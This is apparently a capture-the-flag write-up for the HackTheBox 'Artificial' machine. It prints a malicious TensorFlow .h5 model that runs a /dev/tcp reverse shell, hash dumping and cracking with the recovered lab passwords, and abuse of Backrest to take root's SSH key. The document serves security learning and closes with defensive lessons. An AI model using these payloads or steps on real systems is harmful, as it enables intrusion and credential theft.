---
title: Machine Artificial - HackTheBox
date: 2026-02-01 10:00:00 +0100
categories: [HackTheBox]
tags: [Machines, HackTheBox]
---

![Artificial](/assets/img/posts/Artificial/artificial.jpeg)

## Overview
This is the writeup that describes my journey on Artificial Machine. It's an easy machine with a simple website where you can upload (so you have to "infect") an .h5 file which is a Python TensorFlow module file. Once we get a shell it's necessary to see other services that are present on localhost and exploit the one with backrest.   
- Machine: Artificial
- Operating System: Linux
- Key Vulnerabilities: Insecure Deserialization, Command Injection, Weak Hashing Algorithm (MD5), Credential Leakage, SSH Key Exposure.

## Initial Foothold
```bash
sudo nmap -sC -sV 10.10.11.74 -oA nmap
Nmap scan report for 10.10.11.74
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 10:27:42 2026 -- 1 IP address (1 host up) scanned in 10.75 seconds
```

## Website Enumeration

So, now we need to add artificial.htb to `/etc/hosts`. Once done, we can surf the website and after registration:
![Webpage](/assets/img/posts/Artificial/webpage.png)
By clicking on Requirements and Dockerfile we have specs on how it is built. More precisely, we can download the Dockerfile in order to have the exact same version necessary to upload and execute successfully an .h5 file.
So, we can now download the requirements file, understand which version is used and search for a vulnerability:
![requirements](/assets/img/posts/Artificial/requirements.png)
After some research, I found: [TensorFlow RCE](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)

## Reverse Shell

So based on what we read we can use:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("touch /tmp/pwned")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
Of course our goal is to obtain a reverse shell so we have to change the argument on os.system. We can craft a reverse shell payload on: [revshells.com](https://www.revshells.com/)
![revshell](/assets/img/posts/Artificial/revshell.png)
So, the payload will be:
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("sh -i >& /dev/tcp/your_ip/4444 0>&1")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Ok, we have now our payload but if we try to upload it it doesn't work.. Why? Because a different versioning. We have to create the .h5 file on a container created via the Dockerfile downloadable from the website.
### Create the container
Here is the Dockerfile:
```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
apt-get install -y curl && \
curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

In the folder where the Dockerfile is located, run:
```bash
docker build -t tensorflow_exploit .
```
Then run the container:
```bash
docker run -it tensorflow_exploit
```
Open a new terminal and find the container ID:
```bash
docker ps
```
Copy your exploit script to the container:
```bash
docker cp exploit_model.py <container_id>:/code/
```
Back in the container terminal, run the script:
```bash
python /code/exploit_model.py
```

Extract the generated .h5 file back to the host machine:
```bash
docker cp <container_id>:/code/exploit.h5 ./
```

Set up your netcat listener:
```bash
nc -lvnp 4444
```

Upload the exploit.h5 file to the website and here's the shell:
![shell_gained](/assets/img/posts/Artificial/shell_gained.png)

### Stabilizing the Shell

Once we get the reverse shell, let's stabilize it for better interaction:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Then press `Ctrl+Z` to background the shell, and in your terminal:
```bash
stty raw -echo; fg
```
Finally, in the reverse shell:
```bash
export TERM=xterm
```
Now we have a fully interactive shell!

## Enumeration and Credential Discovery

With a fully interactive shell, we can explore the server. After some enumeration, I found a database file:

![userdb](/assets/img/posts/Artificial/userdb.png)

Let's use **sqlite3** to extract information from the database:

```bash
sqlite3 users.db '.tables'            
model  user 
```

Now let's dump the user table:
```bash
sqlite3 users.db 'select * from user;'
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|prova|prova@prova.it|189bbbb00c5f1fb7fba9ad9285f193d1

```

Great! We found MD5 hashes. Let's crack them using hashcat with the rockyou wordlist:
```bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt

c99175974b6e192936d97224638a34f8:mattp005numbertwo
bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036
189bbbb00c5f1fb7fba9ad9285f193d1:prova

```

Perfect! Let's login via SSH:

```bash
ssh gael@artificial.htb

password: mattp005numbertwo
```

![gael](/assets/img/posts/Artificial/gael.png)

Let's grab the user flag:
```bash
cat user.txt
```

## Lateral Movement

After some checks including **sudo -l**, no PrivEsc entries show up. Let's check what services are running on localhost:

```bash
netstat -tuln
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:5000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:9898          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN 
```

Interesting! There's a service running on localhost:9898. Let's use SSH port forwarding to access it from our machine:

```bash
ssh -L 9898:127.0.0.1:9898 -N gael@artificial.htb
```

Now we can access it at `http://localhost:9898` in our browser:

![backrest](/assets/img/posts/Artificial/backrest.png)

## Privilege Escalation

**Backrest** is a web-based backup management tool that provides a UI for restic backups. After trying various password combinations without success, let's search for configuration files or backups on the server:

```bash
gael@artificial:/var/backups$ ls
apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  apt.extended_states.3.gz  apt.extended_states.4.gz  apt.extended_states.5.gz  apt.extended_states.6.gz  backrest_backup.tar.gz
```

Excellent! We found **backrest_backup.tar.gz**. Let's transfer it to our machine using scp:

```bash
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz ./
```

Extract the archive:
```bash
tar -xzf backrest_backup.tar.gz
```

Inside the archive we found the configuration file:
```bash
cat backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

The password hash is base64 encoded. Let's decode it:
```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

![decrypt_backrest](/assets/img/posts/Artificial/decrypt_backrest.png)

This is a bcrypt hash (mode 3200 in hashcat). Let's crack it:

```bash
hashcat -m 3200 bcrypt_hash /usr/share/wordlists/rockyou.txt --show
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```

Perfect! The password is **!@#$%^**. Let's login to Backrest:

![backrest_login](/assets/img/posts/Artificial/backrest_login.png)

Now that we have access to Backrest, we can exploit it to access privileged files. Backrest allows us to create repositories and backup any directory we have permissions to read.

Let's create a new repository:
- Name: root_backup
- URI: /root

![create_repo](/assets/img/posts/Artificial/create_repo.png)

Now create a backup plan targeting the `/root/.ssh` directory:

![backup_plan](/assets/img/posts/Artificial/backup_plan.png)

Run the backup and then browse/download it. We can extract the SSH private key from `/root/.ssh/id_rsa`:

![id_rsa](/assets/img/posts/Artificial/id_rsa.png)

Now we can use this private key to login as root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@artificial.htb
```

And we're root!

```bash
cat /root/root.txt
```

## Conclusion

This machine demonstrated several important security concepts:
1. **Insecure Deserialization**: The TensorFlow Lambda layer allowed arbitrary code execution through a malicious .h5 file
2. **Weak Password Hashing**: MD5 hashes were easily cracked, leading to credential compromise
3. **Credential Exposure**: Sensitive configuration files were stored in backups without proper protection
4. **Backup Software Misconfiguration**: Backrest running with elevated privileges allowed access to restricted directories

Key takeaways:
- Always validate and sanitize user uploads, especially when dealing with serialized objects
- Use strong hashing algorithms (bcrypt, argon2) for password storage
- Protect backup files and configuration files with appropriate permissions
- Run backup services with minimal required privileges and proper access controls